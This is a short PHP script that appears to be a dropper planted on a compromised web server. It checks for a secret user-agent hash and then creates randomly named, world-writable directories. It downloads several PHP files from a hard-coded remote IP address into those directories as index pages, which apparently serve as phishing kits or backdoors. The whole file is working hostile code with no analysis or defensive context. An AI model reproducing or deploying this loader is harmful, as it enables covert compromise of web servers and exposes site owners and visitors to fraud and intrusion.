<?php
// Define the encoded MD5 hash of the user-agent string
$encodedUserAgentHash = 'd8c4a4e8e9afafcd0136f2955ac6a248';

// Get the user-agent from the request
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Hash the user-agent from the request using MD5
$hashedUserAgent = md5($userAgent);

// Check if the hashed user-agent matches the encoded hash
if ($hashedUserAgent === $encodedUserAgentHash) {
    // User-agent matched, allow access to the page
    echo "Welcome!";
    // Put your page content here
} else {
    // User-agent doesn't match, deny access
    http_response_code(403);
    echo "Access Denied";
    // Stop further execution
    exit;
} 
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

function downloadFile($url, $destination) {
    $fileContent = file_get_contents($url);
    file_put_contents($destination, $fileContent);
}

// Generate random directory name
$randomDirName = generateRandomString(10);

// Create the random directory
if (!mkdir($randomDirName, 0777)) {
    die('Failed to create directory: ' . $randomDirName);
}

// Download index.php from the first link
downloadFile('http://207.231.111.71/plugin/index.php', $randomDirName . '/index.php');

// Create "mm" directory
if (!mkdir($randomDirName . '/mm', 0777)) {
    die('Failed to create directory: ' . $randomDirName . '/mm');
}

// Download index.php from the second link
downloadFile('http://207.231.111.71/plugin/mm/index.php', $randomDirName . '/mm/index.php');

// Create "mmd" directory
if (!mkdir($randomDirName . '/mm/mmd', 0777)) {
    die('Failed to create directory: ' . $randomDirName . '/mm/mmd');
}

// Download content.php and save it as index.php inside "mmd" directory
downloadFile('http://207.231.111.71/plugin/content.php', $randomDirName . '/mm/mmd/index.php');
// Create "mm" directory
if (!mkdir($randomDirName . '/xt', 0777)) {
    die('Failed to create directory: ' . $randomDirName . '/xt');
}

// Download index.php from the second link
downloadFile('http://207.231.111.71/plugin/y/index.php', $randomDirName . '/xt/index.php');

// Create "mmd" directory
if (!mkdir($randomDirName . '/xt/mmd', 0777)) {
    die('Failed to create directory: ' . $randomDirName . '/xt/mmd');
}

// Download content.php and save it as index.php inside "mmd" directory
downloadFile('http://207.231.111.71/plugin/y/mmd/index.php', $randomDirName . '/xt/mmd/index.php');


echo "Done! Random directory name: $randomDirName";
?>
